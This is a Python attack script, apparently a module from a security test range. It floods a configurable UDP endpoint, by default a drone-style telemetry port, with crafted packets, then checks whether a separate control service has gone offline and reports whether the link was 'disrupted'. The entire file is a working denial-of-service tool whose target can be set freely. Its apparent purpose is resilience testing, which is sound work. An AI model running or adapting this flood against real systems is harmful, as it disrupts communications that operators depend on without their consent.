#!/usr/bin/env python3
"""peer_flood (INJECT): UDP burst against downlink endpoint with conservative verdict."""

from __future__ import annotations

import json
import os
import socket
import sys
import time

DEFAULT_TARGET = os.environ.get("PEER_FLOOD_TARGET", "172.30.0.10:14555")
DEFAULT_COUNT = int(os.environ.get("PEER_FLOOD_COUNT", "300"))
DEFAULT_INTERVAL_MS = int(os.environ.get("PEER_FLOOD_INTERVAL_MS", "2"))
C2_HOST = os.environ.get("C2_CHECK_HOST", "172.30.0.20")
C2_PORT = int(os.environ.get("C2_CHECK_PORT", "8080"))


def emit(accepted: bool, blocked_by: str | None, effect: dict[str, str] | None = None) -> None:
    out = {
        "accepted": bool(accepted),
        "blocked_by": blocked_by,
        "effect": effect if (accepted and effect) else {},
        "signed": None,
    }
    print(json.dumps(out))


def parse_target(argv: list[str]) -> tuple[str, int]:
    toks: list[str] = []
    for a in argv[1:]:
        toks.extend(str(a).split())
    ep = toks[0] if toks else DEFAULT_TARGET
    if ":" in ep:
        h, p = ep.rsplit(":", 1)
        try:
            return h, int(p)
        except ValueError:
            pass
    return ep, 14555


def tcp_up(host: str, port: int, timeout_s: float = 1.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout_s):
            return True
    except OSError:
        return False


def flood_udp(host: str, port: int, count: int, interval_ms: int) -> int:
    payload = b"\xFE\x09\x00DAH-PEER-FLOOD"
    sent = 0
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        for _ in range(max(1, count)):
            try:
                s.sendto(payload, (host, port))
                sent += 1
            except OSError:
                break
            if interval_ms > 0:
                time.sleep(interval_ms / 1000.0)
    return sent


def main() -> None:
    host, port = parse_target(sys.argv)
    before = tcp_up(C2_HOST, C2_PORT)
    sent = flood_udp(host, port, DEFAULT_COUNT, DEFAULT_INTERVAL_MS)
    time.sleep(0.5)
    after = tcp_up(C2_HOST, C2_PORT)

    disrupted = before and (not after)
    if sent > 0 and disrupted:
        emit(True, None, {"c2": "disrupted"})
        return
    emit(False, "no_effect")


if __name__ == "__main__":
    main()
